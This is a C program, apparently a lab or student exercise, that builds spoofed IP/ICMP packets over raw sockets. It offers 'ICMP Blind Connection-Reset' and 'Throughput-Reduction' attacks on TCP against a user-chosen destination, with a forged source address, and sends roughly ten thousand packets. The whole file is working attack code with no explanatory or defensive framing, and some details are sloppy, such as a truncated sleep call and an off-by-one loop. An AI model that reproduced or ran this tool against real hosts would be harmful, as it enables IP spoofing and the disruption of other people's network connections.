#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
// #include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>


/* ICMP Header */
struct icmpHeader
{
	unsigned char icmp_type; //ICMP message type
	unsigned char icmp_code; //Error Code
	unsigned short int icmp_cksum; //Checksum for ICMP Header and data
	unsigned short int icmp_id; //Used for identifying request
	unsigned short int icmp_seq; //Sequence Number

};

unsigned short calculate_checksum (unsigned short *buf, int length){

	unsigned short *w = buf;
	int nleft = length;
	int sum = 0;
	unsigned short temp = 0;

	while(nleft>1){

		sum += *w++;
		nleft -=2;
	}

	if(nleft == 1){
		*(u_char *) (&temp) = *(u_char *)w;
		sum += temp; 
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short) (~sum);


}

void send_raw_ip_packet(struct ip* ip_header) {

	struct sockaddr_in dest_info;
	int enable = 1;


	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip_header->ip_dst;

	sendto(sock, ip_header, ntohs(ip_header->ip_len), 0, (struct sockaddr *) &dest_info, sizeof(dest_info));

	close(sock);

}

int main(){

	char source[20],destination[20];
	int packet_count= 10000, choice;

	printf("Enter Source IP Address: ");
	scanf("%s", source);

	printf("Enter Destination IP Address: ");
	scanf("%s", destination);

	printf("Options:\n1. ICMP Blind Connection-Reset Attack on TCP\n2. ICMP Blind Throughput-Reduction Attack on TCP\n");

	printf("Choose Attack (enter 1 or 2): ");
	scanf("%d", &choice);

	if (choice != 1 && choice != 2) {
		printf("Invalid choice!!!");
		return 0;
	}

	printf("Source: %s\n",source );
	printf("Destination:%s\n",destination );


	char buffer[1500];

	memset(buffer, 0, 1500);

	int i;

	struct icmpHeader *icmp_header = (struct icmpHeader *) (buffer + sizeof(struct ip));

	if (choice == 1) {
		icmp_header->icmp_type = 3;
		icmp_header->icmp_code = 3;
	} else {
		icmp_header->icmp_type = 4;
		icmp_header->icmp_code = 0;
	}

	icmp_header->icmp_cksum = 0;
	icmp_header->icmp_cksum = calculate_checksum((unsigned short *) icmp_header, sizeof(struct icmpHeader));


	struct ip *ip_header = (struct ip *) buffer;
	ip_header->ip_v = 4;
	ip_header->ip_hl = 5;
	ip_header->ip_ttl = 20;
	ip_header->ip_src.s_addr = inet_addr(source);
	ip_header->ip_dst.s_addr = inet_addr(destination);
	ip_header->ip_p = IPPROTO_ICMP;
	ip_header->ip_len = htons(sizeof(struct ip) + sizeof(struct icmpHeader));

	

	for(i=0;i<=packet_count;i++){
		sleep(0.5);
		send_raw_ip_packet(ip_header);
	}

	printf("Total %d packets sent....... \n",packet_count);
	
	return 0;
}
